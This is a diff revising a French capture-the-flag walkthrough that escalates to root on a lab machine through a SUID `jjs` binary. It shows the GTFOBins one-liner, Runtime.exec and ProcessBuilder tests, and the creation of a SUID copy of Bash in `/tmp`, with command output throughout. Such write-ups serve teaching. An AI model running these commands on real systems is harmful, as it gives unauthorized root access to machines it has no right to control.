@@ -1218,70 +1218,69 @@ Le script indique également que `jjs` figure dans la liste GTFOBins :
 
 Enfin, `suid3num.py` propose directement une commande d’exploitation :
 
-```bash
+```text
 [&] Manual Exploitation (Binaries which create files on the system)
 ------------------------------
 [&] Jjs ( /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs )
 echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
-Avant d’exécuter cette commande, il est toutefois préférable de vérifier manuellement les permissions de `jjs` et de comprendre ce que la commande proposée cherche à faire.
+Il serait tentant de copier cette commande telle quelle et de l’exécuter immédiatement.
+
+Dans notre cas, son exécution ne fournit cependant pas de shell exploitable et laisse le terminal bloqué.
+
+La commande est relativement complexe : elle lance plusieurs shells, utilise l’option `-p` pour conserver les privilèges effectifs et manipule directement les entrées et sorties du terminal avec `tty`.
+
+Plutôt que de poursuivre avec cette commande complexe, tu vas d’abord vérifier de manière simple et contrôlée comment `jjs` permet d’exécuter des commandes avec les privilèges effectifs de `root`.
 
 ### Exploitation du SUID
 
-Avant d’utiliser la commande proposée automatiquement par `suid3num.py`, vérifie d’abord manuellement les permissions de `jjs` :
+Commence par vérifier directement les permissions de `jjs` :
 
 ```bash
 ls -l /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
-Le résultat confirme que le binaire appartient à `root` et possède bien le bit SUID.
+Le résultat confirme que le binaire appartient à `root` et possède bien le bit SUID :
+
+```text
+-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+```
+
+Le `s` présent dans les permissions du propriétaire confirme que le bit SUID est actif. Le binaire possède également le bit SGID pour le groupe `admin`.
 
 Le principe est important à comprendre : lorsqu’un programme SUID appartenant à `root` est exécuté, il peut fonctionner avec les privilèges effectifs de `root`, même s’il est lancé depuis le compte `admin`.
 
-Dans notre cas, `jjs` est particulièrement intéressant puisqu’il s’agit d’un interpréteur JavaScript capable d’utiliser les classes Java pour lancer des commandes système.
-
-`suid3num.py` propose directement la commande suivante :
-
-```bash
-echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
-```
-
-Cette commande peut sembler difficile à lire, mais son principe de base est assez simple.
-
-La partie :
+Dans notre cas, `jjs` est particulièrement intéressant. La construction utilisée par `suid3num.py` repose notamment sur :
 
 ```javascript
 Java.type('java.lang.Runtime').getRuntime().exec(...)
 ```
 
-permet à `jjs` d’utiliser la classe Java `java.lang.Runtime` pour lancer une commande système.
+Ce code montre que `jjs` permet d’accéder aux classes Java depuis JavaScript, notamment à `java.lang.Runtime`, dont la méthode `exec()` peut lancer des commandes système.
 
-Autrement dit, `jjs` ne se limite pas à exécuter du JavaScript : il peut aussi appeler des classes Java capables de démarrer des programmes externes.
+Pour observer ce comportement, tu peux commencer par demander directement à `jjs` d’exécuter `id` :
 
-La commande proposée par `suid3num.py` va cependant plus loin que cela. Elle essaie directement d’ouvrir un shell privilégié et de rediriger ses entrées et sorties vers le terminal courant.
-
-Dans notre cas, l’exécution de cette commande a bloqué le terminal sans fournir de shell correctement exploitable.
-
-Ce comportement est probablement lié au contexte de ta session : tu es déjà passé par plusieurs couches de shell, depuis la connexion SSH avec le compte `mango`, puis un `su admin`. La commande GTFOBins tente encore d’ouvrir un shell privilégié tout en redirigeant ses entrées et sorties vers le terminal courant. Cet empilement de sessions et de redirections peut donc perturber la gestion du TTY.
-
-Plutôt que d’insister avec cette commande complexe, il est plus sûr de repartir du mécanisme essentiel et de tester d’abord une commande simple et contrôlée.
-
-Tu pourrais, par exemple, demander à `jjs` d’exécuter directement la commande `id` :
-
-```javascript
-Java.type("java.lang.Runtime").getRuntime().exec("/usr/bin/id")
+```bash
+echo 'Java.type("java.lang.Runtime").getRuntime().exec("/usr/bin/id")' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
-Cette commande lance bien `id`, mais `Runtime.exec()` n’affiche pas directement sa sortie dans ton terminal.
+Le résultat obtenu est :
 
-Pour rendre le test plus lisible, tu peux utiliser une autre classe Java prévue elle aussi pour lancer des processus : `ProcessBuilder`.
-
-Son avantage ici est qu’elle permet facilement de rattacher le processus lancé à ton terminal courant grâce à :
-
-```javascript
-inheritIO()
+```text
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs> Java.type("java.lang.Runtime").getRuntime().exec("/usr/bin/id")
+Process[pid=2059, exitValue="not exited"]
+jjs>
 ```
+
+La commande `id` a bien été lancée, mais son résultat n’apparaît pas dans le terminal.
+
+À la place, `jjs` affiche simplement une information indiquant qu’un nouveau processus a été démarré.
+
+La sortie standard de ce processus n’est pas automatiquement reliée à celle de `jjs`, et donc à ton terminal.
+
+Pour afficher directement le résultat de la commande, tu peux utiliser `ProcessBuilder` avec `inheritIO()`, qui permet de rattacher les entrées et sorties du processus lancé à celles du terminal courant.
 
 Tu peux alors demander à `jjs` de lancer Bash puis d’exécuter `id` :
 
@@ -1291,19 +1290,23 @@ echo 'new java.lang.ProcessBuilder("/bin/bash","-p","-c","id").inheritIO().start
 
 La partie :
 
-```text
+```bash
 /bin/bash -p -c id
 ```
 
 signifie simplement :
 
 - lancer Bash ;
-- conserver les privilèges effectifs avec `-p` ;
-- exécuter la commande `id`.
+- utiliser l’option `-p` pour demander à Bash de conserver les privilèges effectifs hérités ;
+- exécuter la commande `id` avec `-c`.
+
+L’option `-p` est importante ici. Le processus lancé possède un UID réel correspondant à `admin`, mais un UID effectif égal à `0` grâce au bit SUID de `jjs`.
+
+Sans cette option, Bash peut abandonner ces privilèges élevés. Avec `-p`, il conserve l’UID effectif de `root`.
 
 Le résultat obtenu est :
 
-```bash
+```text
 Warning: The jjs tool is planned to be removed from a future JDK release
 jjs> new java.lang.ProcessBuilder("/bin/bash","-p","-c","id").inheritIO().start().waitFor()
 uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
@@ -1313,21 +1316,21 @@ jjs>
 
 La partie importante est :
 
-```bash
+```text
 euid=0(root)
 ```
 
-Ton UID réel reste celui du compte `admin`, mais l’UID effectif du processus est bien celui de `root`.
+Ton UID réel reste celui du compte `admin`, mais l’UID effectif du processus est désormais celui de `root`.
 
-Le `0` affiché juste après correspond simplement au code de retour de la commande : `0` indique qu’elle s’est terminée correctement.
+Le `0` affiché juste après correspond au code de retour renvoyé par `waitFor()` : il indique que la commande s’est terminée correctement.
 
-Cela confirme que le bit SUID de `jjs` permet bien d’exécuter des commandes avec les privilèges effectifs de `root`.
-
-Il reste maintenant à transformer cette possibilité en un shell privilégié pratique à utiliser.
+Ce test confirme donc que `jjs` permet bien d’exécuter une commande avec les privilèges effectifs de `root`.
 
 ### Root shell
 
-À ce stade, deux voies s’imposent naturellement pour transformer l’exécution avec `euid=0(root)` en shell réellement pratique :
+Il reste maintenant à transformer cette possibilité en un shell privilégié pratique à utiliser.
+
+Deux approches simples sont particulièrement adaptées ici :
 
 - lancer un reverse shell privilégié vers Kali ;
 - créer une copie de Bash capable de conserver les privilèges de `root` avec l’option `-p`.
@@ -1338,9 +1341,11 @@ Tu vas donc utiliser la seconde méthode.
 
 #### Root shell dans `/dev/shm`
 
-Puisque tu travailles déjà dans `/dev/shm`, l’idée la plus naturelle est d’y créer une copie de Bash.
+Tu travailles déjà dans `/dev/shm`, un emplacement accessible en écriture par le compte `admin`. Il constitue donc un endroit pratique pour effectuer un premier essai.
 
-Grâce à `jjs`, tu peux demander à un processus exécuté avec `euid=0(root)` de copier `/bin/bash` :
+L’idée est d’y créer une copie de Bash appartenant à `root`, puis de lui attribuer le bit SUID afin de pouvoir conserver les privilèges effectifs de `root` lors de son exécution avec l’option `-p`.
+
+Grâce à `jjs`, tu peux d’abord copier `/bin/bash` :
 
 ```bash
 echo 'Java.type("java.lang.Runtime").getRuntime().exec("/bin/cp /bin/bash /dev/shm/rootbash").waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
@@ -1352,21 +1357,27 @@ Tu peux ensuite attribuer le bit SUID à cette copie :
 echo 'Java.type("java.lang.Runtime").getRuntime().exec("/bin/chmod 4755 /dev/shm/rootbash").waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
-L’objectif est que `rootbash`, appartenant à `root` et possédant le bit SUID, puisse ensuite être lancé avec :
+La valeur `4755` correspond aux permissions classiques `755`, auxquelles s’ajoute le bit SUID représenté par le premier chiffre `4`.
+
+Vérifie alors les permissions du fichier :
+
+```bash
+ls -l /dev/shm/rootbash
+```
+
+La présence du `s` dans les permissions confirme que le bit SUID a bien été appliqué.
+
+Lance maintenant la copie de Bash avec l’option `-p` :
 
 ```bash
 /dev/shm/rootbash -p
 ```
 
-L’option `-p` demande à Bash de conserver ses privilèges effectifs.
+Cette fois, le résultat n’est pas celui attendu : malgré la présence du bit SUID, le shell n’obtient pas les privilèges effectifs de `root`.
 
-Cette tentative ne fonctionne cependant pas comme prévu.
+Le problème ne vient donc pas de la copie de Bash ni du `chmod`, mais de l’emplacement dans lequel le fichier est exécuté.
 
-Même si le fichier possède bien le bit SUID, celui-ci n’est pas pris en compte lorsqu’il est exécuté depuis `/dev/shm`.
-
-La raison vient des options de montage de ce système de fichiers.
-
-Tu peux les vérifier avec :
+Vérifie les options de montage de `/dev/shm` :
 
 ```bash
 mount | grep '/dev/shm'
@@ -1374,7 +1385,7 @@ mount | grep '/dev/shm'
 
 Le résultat est sans ambiguïté :
 
-```bash
+```text
 tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
 ```
 
@@ -1384,17 +1395,17 @@ L’option :
 nosuid
 ```
 
-indique au noyau d’ignorer les bits SUID et SGID des fichiers exécutés depuis ce point de montage.
+indique que les bits SUID et SGID ne sont pas pris en compte lors de l’exécution de fichiers situés sur ce point de montage.
 
-Autrement dit, même si `/dev/shm/rootbash` appartient à `root` et possède bien le bit SUID, celui-ci ne sera pas pris en compte lors de son exécution depuis `/dev/shm`.
+C’est donc cette option qui empêche `/dev/shm/rootbash` d’obtenir les privilèges effectifs de `root`, malgré son bit SUID.
 
-Il faut donc choisir un autre emplacement.
+Il faut donc essayer un autre emplacement.
 
 #### Root shell dans `/tmp`
 
-Comme `/dev/shm` est monté avec l’option `nosuid`, il faut choisir un autre emplacement.
+Comme `/dev/shm` est monté avec l’option `nosuid`, il faut essayer un autre emplacement.
 
-Tu peux reprendre exactement la même méthode dans `/tmp`.
+Tu peux tester `/tmp` en reprenant exactement la même méthode.
 
 Commence par demander à `jjs` de copier `/bin/bash` vers `/tmp/rootbash` :
 
@@ -1410,17 +1421,21 @@ Attribue ensuite le bit SUID à cette copie :
 echo 'Java.type("java.lang.Runtime").getRuntime().exec("/bin/chmod 4755 /tmp/rootbash").waitFor()' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
-Vérifie les permissions :
+Vérifie ensuite les permissions du fichier :
 
 ```bash
 ls -l /tmp/rootbash
 ```
 
-Le résultat confirme que le fichier appartient à `root` et possède bien le bit SUID :
+Le résultat confirme que la copie appartient à `root` et possède bien le bit SUID :
 
 ```text
 -rwsr-xr-x 1 root admin 1113504 Sep  7 09:30 /tmp/rootbash
 ```
+
+Le `s` dans les permissions du propriétaire confirme que le bit SUID est actif.
+
+Le groupe du fichier est toujours `admin`, mais ce n’est pas un problème ici : pour le bit SUID, c’est l’identité du propriétaire qui compte. Comme le fichier appartient à `root`, son exécution peut conserver les privilèges effectifs de `root`.
 
 Tu peux maintenant lancer cette copie avec l’option `-p` :
 
@@ -1434,26 +1449,37 @@ Le prompt change :
 rootbash-4.4#
 ```
 
-Vérifie immédiatement les privilèges obtenus :
+Ce changement de prompt est encourageant, mais il ne suffit pas à lui seul pour confirmer les privilèges obtenus.
+
+Vérifie-les avec :
 
 ```bash
 id
 ```
 
-Le résultat confirme que ton UID réel reste celui de `admin`, mais que ton UID effectif est bien celui de `root` :
+Le résultat est :
 
 ```text
 uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
 ```
 
-Tu disposes donc maintenant d’un shell privilégié.
+Ton UID réel reste celui du compte `admin`, mais l’UID effectif est désormais celui de `root`.
+
+C’est cet UID effectif qui est utilisé pour déterminer les privilèges du processus. Avec `euid=0(root)`, le shell dispose donc des privilèges de `root`.
+
+Tu disposes maintenant d’un shell privilégié.
 
 ### root.txt
 
-Une fois root, Il ne te reste plus qu’à récupérer le flag final :
+Une fois le shell privilégié obtenu, il ne te reste plus qu’à récupérer le flag final :
 
 ```bash
 cat /root/root.txt
+```
+
+Le contenu du fichier confirme l’accès au compte `root` :
+
+```text
 722cxxxxxxxxxxxxxxxxxxxxxxxxxxxc5ec
 ```
 
